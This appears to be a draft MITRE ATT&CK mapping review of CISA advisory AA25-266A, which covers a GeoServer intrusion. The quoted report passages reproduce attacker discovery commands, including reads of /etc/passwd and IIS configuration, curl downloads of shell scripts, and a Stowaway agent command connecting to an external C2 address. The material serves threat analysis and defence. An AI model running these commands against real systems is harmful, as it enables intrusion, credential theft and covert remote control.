    The cyber threat actors then used curl commands to download a shell script named mm.sh (which they 
    renamed to aa.sh) and a zip file named aaa.zip to the /tmp/ directory.

**同页前后文**

    to execute the following host discovery commands on 
    GeoServer 1: 
     uname-a 
     df-h 
     env 
     ps -aux 
     ipconfig 
     date 
     who -b 
     rpm -qa polkit 
     netstat -ano 
    Additionally, they employed LOTL techniques for user, service, filesystem, and network discovery on 
    GeoServer 1: 
     cat /etc/passwd 
     cat /etc/resolv.conf 
     cat /usr/local/apache-tomcat-9.0.89/webapps/geoserver/WEB-INF/web.xml 
     cat /etc/redhat-release 
     cat /etc/os-release  
    The cyber threat actors then used curl commands to download a shell script named mm.sh (which they 
    renamed to aa.sh) and a zip file named aaa.zip to the /tmp/ directory. 
    

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM023 · T1105 Ingress Tool Transfer · high · draft
  The report explicitly states that actors downloaded a shell script and archive to the compromised GeoServer, supporting ingress tool transfer.

**候选** T1218.011, T1059.013, T1037.004, T1564.006, T1553.001, T1027.017, T1105, T1546.004, T1553.005, T1036.002, T1574.001, T1677, T1136.003, T1574.005, T1070.006, T1548.005, T1574.008, T1574.007, T1037.005, T1053.002, T1222.002, T1027.015, T1497.001, T1574.011
**映射复查** The evidence describes downloads only; it does not establish execution, persistence, or shell startup behavior.

## AA25-266A-P014

PDF 第 8 页 · observed · high · draft

**行为** Enumerated the internal network → internal systems

**上下文说明** fscan was used to identify network services.

**引文**

    Subsequently, they enumerated the internal network from GeoServer 1, identifying Secure Shell (SSH) 
    listeners, File Transfer Protocol (FTP) servers, file servers, and web servers  by using the fscan 
    tool. (Note: CISA observed endpoint logs that showed the cyber threat actors uploaded fscan to the

**同页前后文**

    TLP:CLEAR 
    CISA 
    Page 8 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Subsequently, they enumerated the internal network from GeoServer 1, identifying Secure Shell (SSH) 
    listeners, File Transfer Protocol (FTP) servers, file servers, and web servers  by using the fscan 
    tool. (Note: CISA observed endpoint logs that showed the cyber threat actors uploaded fscan to the 
    compromised host and ran it against internal systems.) The actors then attempted to brute force login 
    credentials for the exploited web services to gain remote access, achieve RCE, or move laterally. 
    The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal 
    subnets using fscan. Their use of the -nobr and -nopoc flags for fscan indicated that this scan 
    excluded brute forcing or vulnerability scann

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM024 · T1046 Network Service Discovery · high · draft
  fscan was used to enumerate internal systems and identify SSH, FTP, file, and web services, directly supporting network service discovery.
- AA25-266A-PM025 · T1018 Remote System Discovery · high · draft
  The enumeration also identified multiple internal hosts and servers, supporting remote system discovery.

**候选** T1021, T1105, T1570, T1210, T1499, T1650, T1219.001, T1070.006, T1133, T1098.004, T1046, T1018, T1654, T1526, T1659, T1049, T1136.001, T1119, T1135, T1690, T1078.001, T1187, T1070.003, T1548.005
**映射复查** The expanded definitions confirm service and host discovery. No transfer, exploitation, or remote access technique is established by this behavior.

## AA25-266A-P015

PDF 第 8 页 · attempted · high · draft

**行为** Attempted credential brute force → exploited web services

**上下文说明** The report states the attempt was to gain access or move laterally.

**引文**

    compromised host and ran it against internal systems.) The actors then attempted to brute force login 
    credentials for the exploited web services to gain remote access, achieve RCE, or move laterally.

**同页前后文**

    TLP:CLEAR 
    CISA 
    Page 8 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Subsequently, they enumerated the internal network from GeoServer 1, identifying Secure Shell (SSH) 
    listeners, File Transfer Protocol (FTP) servers, file servers, and web servers  by using the fscan 
    tool. (Note: CISA observed endpoint logs that showed the cyber threat actors uploaded fscan to the 
    compromised host and ran it against internal systems.) The actors then attempted to brute force login 
    credentials for the exploited web services to gain remote access, achieve RCE, or move laterally. 
    The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal 
    subnets using fscan. Their use of the -nobr and -nopoc flags for fscan indicated that this scan 
    excluded brute forcing or vulnerability scanning, respectively. 
    SQL Server 
    CISA observed the following discovery commands on the organization’s SQL server: 
     whoami 
     ipconfig /all 
     ping -n 1 8.8.8.8 
     systeminfo 
     tasklist 
     dir c:\ 
     d

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM026 · T1110 Brute Force · high · draft
  The report explicitly states the actors attempted brute force against credentials for exploited web services.
- AA25-266A-PM027 · T1110.001 Password Guessing · high · draft
  The described brute force effort against login credentials is password guessing; no evidence indicates password spraying.

**候选** T1110, T1187, T1210, T1078.004, T1557.001, T1072, T1133, T1110.003, T1212, T1552.004, T1110.001, T1677, T1555.003, T1550.001, T1078.001, T1563.001, T1539, T1201, T1598.003, T1595.003, T1486, T1021, T1528, T1190
**映射复查** The attempt is explicit but its success is not stated. Password spraying and credential theft techniques are unsupported.

## AA25-266A-P016

PDF 第 8 页 · observed · high · draft

**行为** Conducted ping sweeps → hosts in internal subnets

**上下文说明** Sweep activity used fscan.

**引文**

    The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal 
    subnets using fscan. Their use of the -nobr and -nopoc flags for fscan indicated that this scan 
    excluded brute forcing or vulnerability scanning, respectively.

**同页前后文**

    om GeoServer 1, identifying Secure Shell (SSH) 
    listeners, File Transfer Protocol (FTP) servers, file servers, and web servers  by using the fscan 
    tool. (Note: CISA observed endpoint logs that showed the cyber threat actors uploaded fscan to the 
    compromised host and ran it against internal systems.) The actors then attempted to brute force login 
    credentials for the exploited web services to gain remote access, achieve RCE, or move laterally. 
    The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal 
    subnets using fscan. Their use of the -nobr and -nopoc flags for fscan indicated that this scan 
    excluded brute forcing or vulnerability scanning, respectively. 
    SQL Server 
    CISA observed the following discovery commands on the organization’s SQL server: 
     whoami 
     ipconfig /all 
     ping -n 1 8.8.8.8 
     systeminfo 
     tasklist 
     dir c:\ 
     dir c:\Users 
     type c:\Last.txt 
     type c:\inetpub\wwwroot 
     type c:\inetpub\ 
     dir c:\inetpub\wwwroot 
     dir c:\ 
     dir c:\ifwapps 
     dir d:\ 
     dir e:\ 
     net group "domain admins" /domain 
     type C:\Windows\System32\inetsrv\config\applicationHost.config 
     dir 

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM028 · T1018 Remote System Discovery · high · draft
  The report states that actors ping swept multiple hosts in internal subnets, supporting remote system discovery.

**候选** T1210, T1681, T1110, T1596.005, T1677, T1557.001, T1686.002, T1087, T1595.002, T1596.004, T1018, T1187, T1654, T1046, T1596.001, T1203, T1059.013, T1595.003, T1136.001, T1195.001, T1612, T1219, T1218.011, T1548.001
**映射复查** The behavior is host discovery. The report says the scan excluded brute forcing and vulnerability scanning, so those mappings do not apply.

## AA25-266A-P017

PDF 第 8 页 · observed · high · draft

**行为** Performed host discovery → SQL Server

**上下文说明** CISA observed discovery commands; individual commands omitted.

**引文**

    CISA observed the following discovery commands on the organization’s SQL server:

**同页前后文**

    ainst internal systems.) The actors then attempted to brute force login 
    credentials for the exploited web services to gain remote access, achieve RCE, or move laterally. 
    The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal 
    subnets using fscan. Their use of the -nobr and -nopoc flags for fscan indicated that this scan 
    excluded brute forcing or vulnerability scanning, respectively. 
    SQL Server 
    CISA observed the following discovery commands on the organization’s SQL server: 
     whoami 
     ipconfig /all 
     ping -n 1 8.8.8.8 
     systeminfo 
     tasklist 
     dir c:\ 
     dir c:\Users 
     type c:\Last.txt 
     type c:\inetpub\wwwroot 
     type c:\inetpub\ 
     dir c:\inetpub\wwwroot 
     dir c:\ 
     dir c:\ifwapps 
     dir d:\ 
     dir e:\ 
     net group "domain admins" /domain 
     type C:\Windows\System32\inetsrv\config\applicationHost.config 
     dir c:\ifwapps\Tier1Utilities 
     netstat -ano 
     curl 
     net user 
     tasklist 
    GeoServer 2 
    Based 

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM029 · T1082 System Information Discovery · high · draft
  The SQL Server command set included system information queries, supporting system information discovery.
- AA25-266A-PM030 · T1083 File and Directory Discovery · high · draft
  The observed directory listing and file viewing commands support file and directory discovery.
- AA25-266A-PM031 · T1057 Process Discovery · high · draft
  The observed task listing commands support process discovery.
- AA25-266A-PM032 · T1016 System Network Configuration Discovery · medium · draft
  The observed network configuration and connection queries support system network configuration discovery.
- AA25-266A-PM033 · T1069.002 Domain Groups · high · draft
  The command set included a domain administrators group query, supporting domain group discovery.
- AA25-266A-PM034 · T1033 System Owner/User Discovery · high · draft
  The command set included a current user identity query, supporting system owner or user discovery.

**候选** T1505.001, T1489, T1018, T1556.006, T1561.001, T1059.013, T1498, T1499, T1046, T1485, T1082, T1083, T1057, T1016, T1069.002, T1543.002, T1497.001, T1027.009, T1547.001, T1518.001, T1003.001, T1561.002, T1033, T1055.008
**映射复查** The full command evidence supports several distinct discovery behaviors on the SQL Server. No execution or collection beyond discovery is inferred.

## AA25-266A-P018

PDF 第 8 页 · observed · high · draft

**行为** Used Burp Collaborator to execute host and network discovery → GeoServer 2

**上下文说明** Encoded command contents omitted.

**引文**

    Based on images CISA received of GeoServer 2, CISA observed the bash history of a user that showed the 
    use of Burp Collaborator to execute encoded host and network discovery commands.

**同页前后文**

    erver: 
     whoami 
     ipconfig /all 
     ping -n 1 8.8.8.8 
     systeminfo 
     tasklist 
     dir c:\ 
     dir c:\Users 
     type c:\Last.txt 
     type c:\inetpub\wwwroot 
     type c:\inetpub\ 
     dir c:\inetpub\wwwroot 
     dir c:\ 
     dir c:\ifwapps 
     dir d:\ 
     dir e:\ 
     net group "domain admins" /domain 
     type C:\Windows\System32\inetsrv\config\applicationHost.config 
     dir c:\ifwapps\Tier1Utilities 
     netstat -ano 
     curl 
     net user 
     tasklist 
    GeoServer 2 
    Based on images CISA received of GeoServer 2, CISA observed the bash history of a user that showed the 
    use of Burp Collaborator to execute encoded host and network discovery commands. 
    

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM035 · T1027 Obfuscated Files or Information · high · draft
  The report explicitly describes the host and network discovery commands as encoded, supporting obfuscation of command content.
- AA25-266A-PM036 · T1018 Remote System Discovery · high · draft
  The reported encoded commands performed host discovery on GeoServer 2.
- AA25-266A-PM037 · T1016 System Network Configuration Discovery · medium · draft
  The reported encoded commands also performed network discovery, supporting system network configuration discovery.

**候选** T1070.003, T1690, T1552.003, T1546.004, T1027, T1059.013, T1497.002, T1610, T1018, T1583.001, T1016, T1027.012, T1564.014, T1027.009, T1548.003, T1559.002, T1689, T1189, T1059, T1027.013, T1546.005, T1098.004, T1574.008, T1205.002
**映射复查** The text explicitly supports encoded commands used for host and network discovery. No particular interpreter or payload behavior is established.

## AA25-266A-P019

PDF 第 9 页 · observed · high · draft

**行为** Moved laterally → Web Server to SQL Server

**上下文说明** Incident report describes this movement; procedural detail omitted.

**引文**

    In one instance, the cyber threat actors moved laterally from the Web Server to the SQL Server by enabling 
    xp_cmdshell for RCE on GeoServer 1.

**同页前后文**

    TLP:CLEAR 
    CISA 
    Page 9 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Lateral Movement 
    In one instance, the cyber threat actors moved laterally from the Web Server to the SQL Server by enabling 
    xp_cmdshell for RCE on GeoServer 1. 
    Command and Control 
    The cyber threat actors used PowerShell and bits admin getfile to download payloads.  
    They used Stowaway,  a  publicly available multi- level proxy tool, to establish C2. Stowaway 
    enabled the cyber threat actors to bypass the organization’s intranet restrictions and access internal 
    network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway 
    to disk using a tomcat service acco

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM038 · T1210 Exploitation of Remote Services · high · draft
  The report attributes lateral movement between servers to enabling a remote SQL execution capability, consistent with exploitation of a remote service.

**候选** T1505.001, T1210, T1489, T1681, T1677, T1686.002, T1564.006, T1204.003, T1552.005, T1021.003, T1608.006, T1480.001, T1195.001, T1190, T1134.004, T1082, T1578.003, T1654, T1059.013, T1133, T1072, T1578.001, T1668, T1124
**映射复查** The report explicitly describes movement from the Web Server to the SQL Server. The evidence does not establish malicious SQL procedure installation or the other supplied techniques.

## AA25-266A-P020

PDF 第 9 页 · observed · high · draft

**行为** Downloaded payloads using built-in utilities → compromised systems

**上下文说明** Payload contents omitted.

**引文**

    The cyber threat actors used PowerShell and bits admin getfile to download payloads.

**同页前后文**

    TLP:CLEAR 
    CISA 
    Page 9 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Lateral Movement 
    In one instance, the cyber threat actors moved laterally from the Web Server to the SQL Server by enabling 
    xp_cmdshell for RCE on GeoServer 1. 
    Command and Control 
    The cyber threat actors used PowerShell and bits admin getfile to download payloads.  
    They used Stowaway,  a  publicly available multi- level proxy tool, to establish C2. Stowaway 
    enabled the cyber threat actors to bypass the organization’s intranet restrictions and access internal 
    network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway 
    to disk using a tomcat service account. 
    The actors then executed Stowaway via /var/tmp/agent -c 45.32.22[.]62:4441 -s 
    f86bc7ff68aff3ad –up h

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM039 · T1105 Ingress Tool Transfer · high · draft
  The report explicitly states that payloads were downloaded to compromised systems, supporting ingress tool transfer.
- AA25-266A-PM040 · T1197 BITS Jobs · high · draft
  The report names BITS Admin GetFile in the payload download activity, supporting BITS job transfer.

**候选** T1105, T1197, T1059, T1136.001, T1027.017, T1070.003, T1059.013, T1112, T1027.012, T1668, T1218.011, T1036.008, T1608.001, T1574.001, T1480.001, T1564.006, T1047, T1543.003, T1608.002, T1659, T1570, T1690, T1203, T1553.001
**映射复查** Both the download behavior and the named BITS mechanism are directly supported. The downloaded content is not described as executed in this behavior.

## AA25-266A-P021

PDF 第 9 页 · observed · high · draft

**行为** Used Stowaway to establish command and control → Stowaway

**上下文说明** A publicly available proxy tool was used for C2.

**引文**

    They used Stowaway,  a  publicly available multi- level proxy tool, to establish C2. Stowaway

**同页前后文**

    TLP:CLEAR 
    CISA 
    Page 9 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Lateral Movement 
    In one instance, the cyber threat actors moved laterally from the Web Server to the SQL Server by enabling 
    xp_cmdshell for RCE on GeoServer 1. 
    Command and Control 
    The cyber threat actors used PowerShell and bits admin getfile to download payloads.  
    They used Stowaway,  a  publicly available multi- level proxy tool, to establish C2. Stowaway 
    enabled the cyber threat actors to bypass the organization’s intranet restrictions and access internal 
    network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway 
    to disk using a tomcat service account. 
    The actors then executed Stowaway via /var/tmp/agent -c 45.32.22[.]62:4441 -s 
    f86bc7ff68aff3ad –up http –reconnect 10. 
    To test their level of access, the cyber th reat actors performed a ping swe

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM041 · T1090 Proxy · high · draft
  The report identifies Stowaway as a proxy used to establish command and control, supporting the proxy technique.
- AA25-266A-PM042 · T1090.003 Multi-hop Proxy · medium · draft
  Stowaway is described as a multi-level proxy tool, which supports multi-hop proxying at medium confidence.

**候选** T1090.003, T1218.002, T1601.001, T1176.001, T1048.003, T1599, T1090.002, T1104, T1588.007, T1090.001, T1090, T1218.010, T1220, T1598.003, T1684.002, T1525, T1102.003, T1219, T1580, T1568.001, T1684, T1574.005, T1583.001, T1102.001
**映射复查** Proxy use is explicit. The text identifies the tool as multi-level but does not independently detail every proxy hop in this behavior.
- AI 复核 unsupported_inference · The report calls Stowaway a multi-level proxy tool, but this row supports use of a proxy for C2, not that multiple proxy hops were actually used in this occurrence. Keep the general Proxy mapping; the specific Multi-hop Proxy mapping is not established here.
- AI 复核 duplicate · P021 broadly says Stowaway was used to establish C2; P024 describes downloading a modified Stowaway and successfully establishing the outbound C2 connection on the same page. These may be duplicate descriptions of the same connection; retain distinct download evidence if merged.

## AA25-266A-P022

PDF 第 9 页 · observed · high · draft

**行为** Routed access to internal network resources and wrote proxy tool to disk → Web Server

**上下文说明** Tool used a service account; network details summarized.

**引文**

    network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway 
    to disk using a tomcat service account.

**同页前后文**

     one instance, the cyber threat actors moved laterally from the Web Server to the SQL Server by enabling 
    xp_cmdshell for RCE on GeoServer 1. 
    Command and Control 
    The cyber threat actors used PowerShell and bits admin getfile to download payloads.  
    They used Stowaway,  a  publicly available multi- level proxy tool, to establish C2. Stowaway 
    enabled the cyber threat actors to bypass the organization’s intranet restrictions and access internal 
    network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway 
    to disk using a tomcat service account. 
    The actors then executed Stowaway via /var/tmp/agent -c 45.32.22[.]62:4441 -s 
    f86bc7ff68aff3ad –up http –reconnect 10. 
    To test their level of access, the cyber th reat actors performed a ping sweep of multiple hosts in a 
    particular subnet of the organization’s network. Next, the cyber threat actors downloaded a modified 
    version of Stowaway using a curl command, successfully establishing an outbound connection with their 
    C2 server using HTT

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM043 · T1090.001 Internal Proxy · high · draft
  The report states that C2 traffic was forwarded through the Web Server to access internal resources, supporting use of an internal proxy.

**候选** T1572, T1187, T1133, T1539, T1090.002, T1499, T1210, T1599, T1176.001, T1528, T1090.001, T1090.003, T1601.001, T1556.007, T1598.003, T1114.003, T1548.005, T1608, T1550.004, T1659, T1098.001, T1078, T1111, T1666
**映射复查** Internal proxying is directly described. Writing the proxy tool to disk alone does not establish additional techniques in this behavior.

## AA25-266A-P023

PDF 第 9 页 · observed · high · draft

**行为** Performed a ping sweep → multiple hosts in an organization subnet

**上下文说明** Discovery activity to assess access.

**引文**

    To test their level of access, the cyber th reat actors performed a ping sweep of multiple hosts in a

**同页前后文**

    y,  a  publicly available multi- level proxy tool, to establish C2. Stowaway 
    enabled the cyber threat actors to bypass the organization’s intranet restrictions and access internal 
    network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway 
    to disk using a tomcat service account. 
    The actors then executed Stowaway via /var/tmp/agent -c 45.32.22[.]62:4441 -s 
    f86bc7ff68aff3ad –up http –reconnect 10. 
    To test their level of access, the cyber th reat actors performed a ping sweep of multiple hosts in a 
    particular subnet of the organization’s network. Next, the cyber threat actors downloaded a modified 
    version of Stowaway using a curl command, successfully establishing an outbound connection with their 
    C2 server using HTTP over TCP/4441. 
    On July 14, 2024, the cyber threat actors executed /tmp/mm.sh on the Web Server followed by an 
    encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they 
    use

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM044 · T1018 Remote System Discovery · high · draft
  The report explicitly states the actors ping swept multiple hosts, supporting remote system discovery.

**候选** T1018, T1557.001, T1136.001, T1016.001, T1210, T1684.001, T1677, T1078, T1049, T1574.005, T1564.006, T1205.002, T1070.008, T1592.003, T1681, T1578.003, T1678, T1480.001, T1592, T1070.009, T1204, T1497.001, T1574.001, T1490
**映射复查** This is direct host discovery evidence. No evidence supports the other supplied techniques.

## AA25-266A-P024

PDF 第 9 页 · observed · high · draft

**行为** Downloaded a modified proxy tool and established outbound C2 → Stowaway and C2 server

**上下文说明** The report states the outbound connection succeeded.

**引文**

    particular subnet of the organization’s network. Next, the cyber threat actors downloaded a modified 
    version of Stowaway using a curl command, successfully establishing an outbound connection with their 
    C2 server using HTTP over TCP/4441.

**同页前后文**

    actors to bypass the organization’s intranet restrictions and access internal 
    network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway 
    to disk using a tomcat service account. 
    The actors then executed Stowaway via /var/tmp/agent -c 45.32.22[.]62:4441 -s 
    f86bc7ff68aff3ad –up http –reconnect 10. 
    To test their level of access, the cyber th reat actors performed a ping sweep of multiple hosts in a 
    particular subnet of the organization’s network. Next, the cyber threat actors downloaded a modified 
    version of Stowaway using a curl command, successfully establishing an outbound connection with their 
    C2 server using HTTP over TCP/4441. 
    On July 14, 2024, the cyber threat actors executed /tmp/mm.sh on the Web Server followed by an 
    encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they 
    used Stowaway to establish a second C2 connection over TCP/50012, likely serving as a backup C2 
    channel. 
    CISA discovered evidence of various files hosted on the C2 server, including nu merous publicly available 
    tools and scripts: 
     RingQ ant

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM045 · T1105 Ingress Tool Transfer · high · draft
  The report explicitly states that a modified Stowaway tool was downloaded, supporting ingress tool transfer.
- AA25-266A-PM046 · T1071.001 Web Protocols · high · draft
  The report states that the successful outbound C2 connection used HTTP, supporting web protocol use for command and control.
- AA25-266A-PM047 · T1090 Proxy · medium · draft
  The downloaded tool is identified in the report as a multi-level proxy, supporting proxy use in this C2 activity.

**候选** T1090, T1090.002, T1110.001, T1090.001, T1686.002, T1187, T1059.013, T1048, T1110.003, T1082, T1105, T1071.001, T1570, T1608.002, T1095, T1048.001, T1189, T1572, T1553.001, T1499.001, T1608, T1049, T1598.003, T1608.001
**映射复查** The tool download and HTTP C2 connection are explicit. Proxy use is supported by the report's description of Stowaway, while the precise proxy topology is not established here.

## AA25-266A-P025

PDF 第 9 页 · observed · high · draft

**行为** Executed a script → Web Server

**上下文说明** Script contents were unrecovered; encoded command omitted.

**引文**

    On July 14, 2024, the cyber threat actors executed /tmp/mm.sh on the Web Server followed by an

**同页前后文**

    executed Stowaway via /var/tmp/agent -c 45.32.22[.]62:4441 -s 
    f86bc7ff68aff3ad –up http –reconnect 10. 
    To test their level of access, the cyber th reat actors performed a ping sweep of multiple hosts in a 
    particular subnet of the organization’s network. Next, the cyber threat actors downloaded a modified 
    version of Stowaway using a curl command, successfully establishing an outbound connection with their 
    C2 server using HTTP over TCP/4441. 
    On July 14, 2024, the cyber threat actors executed /tmp/mm.sh on the Web Server followed by an 
    encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they 
    used Stowaway to establish a second C2 connection over TCP/50012, likely serving as a backup C2 
    channel. 
    CISA discovered evidence of various files hosted on the C2 server, including nu merous publicly available 
    tools and scripts: 
     RingQ antivirus defense evasion tool (RingQ.exe, RingQ.rar) 
     IOX proxy tool (iox.rar) 
     BusyBox trojan

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM048 · T1059.004 Unix Shell · high · draft
  The report says a shell script was executed on the Web Server. Unix Shell is supported by the identified shell script execution.

**候选** T1564.006, T1677, T1027, T1037.004, T1210, T1027.017, T1218.011, T1505.003, T1136.001, T1219.003, T1059.004, T1574.007, T1059, T1546.004, T1059.002, T1027.018, T1027.013, T1574.005, T1216.001, T1220, T1205.002, T1564.014, T1027.010, T1027.011
**映射复查** The evidence supports Unix shell command and scripting interpreter activity.

## AA25-266A-P026

PDF 第 9 页 · observed · high · draft

**行为** Established a second C2 connection → Stowaway channel

**上下文说明** The report says it likely served as a backup channel.

**引文**

    encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they 
    used Stowaway to establish a second C2 connection over TCP/50012, likely serving as a backup C2 
    channel.

**同页前后文**

    ect 10. 
    To test their level of access, the cyber th reat actors performed a ping sweep of multiple hosts in a 
    particular subnet of the organization’s network. Next, the cyber threat actors downloaded a modified 
    version of Stowaway using a curl command, successfully establishing an outbound connection with their 
    C2 server using HTTP over TCP/4441. 
    On July 14, 2024, the cyber threat actors executed /tmp/mm.sh on the Web Server followed by an 
    encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they 
    used Stowaway to establish a second C2 connection over TCP/50012, likely serving as a backup C2 
    channel. 
    CISA discovered evidence of various files hosted on the C2 server, including nu merous publicly available 
    tools and scripts: 
     RingQ antivirus defense evasion tool (RingQ.exe, RingQ.rar) 
     IOX proxy tool (iox.rar) 
     BusyBox trojan multi-tool (busybox) 
     WinRAR archive tool (Rar.exe) 
     Stowaway proxy tool (agent, agent.tar, agent.zip, agentu.exe) 
     Web shells (Handx.ashx, start_tomcat.jsp) 
     Various shell scripts (mm.sh, t.py, t1.sh, c.b

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM049 · T1008 Fallback Channels · medium · draft
  The second C2 connection is described as likely serving as a backup channel, which matches fallback communication when a primary channel is unavailable.

**候选** T1104, T1110.001, T1219, T1574.001, T1550.001, T1187, T1546.004, T1110.003, T1011, T1041, T1008, T1568.002, T1499.001, T1027.013, T1011.001, T1601.001, T1216.001, T1049, T1553.003, T1102.003, T1048.002, T1574.005, T1220, T1189
**映射复查** Fallback Channels best fits the explicitly described backup C2 connection; the report does not establish a multistage C2 architecture.

## AA25-266A-P027

PDF 第 9 页 · observed · high · draft

**行为** Transferred a file to the SQL Server → SQL Server

**上下文说明** EDR alert context identifies the file as suspected malware.

**引文**

    additional alerts when the cyber threat actors transferred 1.txt to the SQL Server through bitsadmin

**同页前后文**

    nt, agent.tar, agent.zip, agentu.exe) 
     Web shells (Handx.ashx, start_tomcat.jsp) 
     Various shell scripts (mm.sh, t.py, t1.sh, c.bat) 
    Detection 
    The cyber threat actors remained undetected in the organization’s environment for three weeks before the 
    organization’s SOC identified the compromise using their EDR tool. On July 31, 2024, their EDR tool 
    identified a 1.txt file uploaded as suspected malware on the SQL Server. The SOC responded to 
    additional alerts when the cyber threat actors transferred 1.txt to the SQL Server through bitsadmin 
    after attempting other LOTL techniques, such as leveraging PowerShell and certutil. The alerts 
    

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM050 · T1105 Ingress Tool Transfer · high · draft
  The actors transferred a file to the SQL Server through bitsadmin, consistent with ingress tool or file transfer to a compromised system.

**候选** T1036.008, T1197, T1505.001, T1677, T1105, T1210, T1546.012, T1489, T1690, T1588.002, T1176.001, T1659, T1681, T1608.001, T1548.003, T1570, T1133, T1059.013, T1608.002, T1218.011, T1027.009, T1537, T1070.010, T1219
**映射复查** The evidence supports ingress transfer; it does not show masquerading or that the file moved host-to-host from another compromised system.

## AA25-266A-P028

PDF 第 18 页 · observed · high · draft

**行为** gain initial access → GeoServer 1

**上下文说明** Timeline records initial access to the first GeoServer.

**引文**

    July 11, 2024 GeoServer 1 Initial Access to GeoServer 1.

**同页前后文**

    TLP:CLEAR 
    CISA 
    Page 18 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Appendix: Key Events Timeline 
    Date/Time Relevant Host Event 
    July 1, 2024 n/a CVE-2024-36401 published. 
    July 11, 2024 GeoServer 1 Initial Access to GeoServer 1. 
    July 15, 2024 n/a 
    CVE-2024-36401 added to CISA’s 
    Known Exploited Vulnerabilities 
    Catalog. 
    July 15, 2024 GeoServer 1 EDR detects Stowaway tool on GeoServer 1. 
    July 24, 2024 GeoServer 2 Initial Access to GeoServer 2. 
    July 31, 2024 Web Server Initial Access to Web Server. 
    July 31, 2024 SQL Server Initial Access to SQL Server. 
    Aug. 1, 2024 SQL Server, GeoServer 1 
    Organization observes SQL Alert and 
    contains SQL Server and GeoServer 
    1. 
    A

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM051 · T1190 Exploit Public-Facing Application · high · draft
  The report attributes GeoServer 1 initial access to exploitation of CVE-2024-36401 on a public-facing GeoServer, matching exploitation of a public-facing application.

**候选** T1195.001, T1486, T1590.002, T1566.001, T1036.007, T1566.002, T1098.005, T1047, T1110, T1056.004, T1190, T1588.005, T1587.004, T1189, T1595.002, T1686.002, T1210, T1212, T1595, T1211, T1553.001, T1068, T1596.005, T1611
**映射复查** The report context supports this technique for the GeoServer 1 access event.

## AA25-266A-P029

PDF 第 18 页 · observed · high · draft

**行为** gain initial access → GeoServer 2

**上下文说明** Timeline records a separate initial access event on the second GeoServer.

**引文**

    July 24, 2024 GeoServer 2 Initial Access to GeoServer 2.

**同页前后文**

    TLP:CLEAR 
    CISA 
    Page 18 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Appendix: Key Events Timeline 
    Date/Time Relevant Host Event 
    July 1, 2024 n/a CVE-2024-36401 published. 
    July 11, 2024 GeoServer 1 Initial Access to GeoServer 1. 
    July 15, 2024 n/a 
    CVE-2024-36401 added to CISA’s 
    Known Exploited Vulnerabilities 
    Catalog. 
    July 15, 2024 GeoServer 1 EDR detects Stowaway tool on GeoServer 1. 
    July 24, 2024 GeoServer 2 Initial Access to GeoServer 2. 
    July 31, 2024 Web Server Initial Access to Web Server. 
    July 31, 2024 SQL Server Initial Access to SQL Server. 
    Aug. 1, 2024 SQL Server, GeoServer 1 
    Organization observes SQL Alert and 
    contains SQL Server and GeoServer 
    1. 
    Aug. 1, 2024 n/a The impacted organization requested assistance from CISA 
    Aug. 5, 2024 n/a CISA began forensic artifact analysis. 
    Aug. 6, 2024 GeoServer 2 
    Last observed threat actors’ 
    activity—discovery commands on 
    Ge

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM052 · T1190 Exploit Public-Facing Application · high · draft
  The report attributes the separate GeoServer 2 initial access to exploitation of the same vulnerability on the public-facing GeoServer, matching exploitation of a public-facing application.

**候选** T1195.001, T1550.001, T1189, T1546.012, T1564.014, T1036.007, T1195, T1685.001, T1199, T1590.002, T1190, T1588.005, T1587.004, T1595.002, T1686.002, T1210, T1212, T1595, T1211, T1068, T1596.005, T1611, T1566.001, T1592.003
**映射复查** This is a distinct GeoServer 2 access occurrence, supported by the report context.

## AA25-266A-P030

PDF 第 18 页 · observed · high · draft

**行为** gain initial access → Web Server

**上下文说明** Timeline records initial access to the Web Server.

**引文**

    July 31, 2024 Web Server Initial Access to Web Server.

**同页前后文**

    EAR 
    CISA 
    Page 18 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Appendix: Key Events Timeline 
    Date/Time Relevant Host Event 
    July 1, 2024 n/a CVE-2024-36401 published. 
    July 11, 2024 GeoServer 1 Initial Access to GeoServer 1. 
    July 15, 2024 n/a 
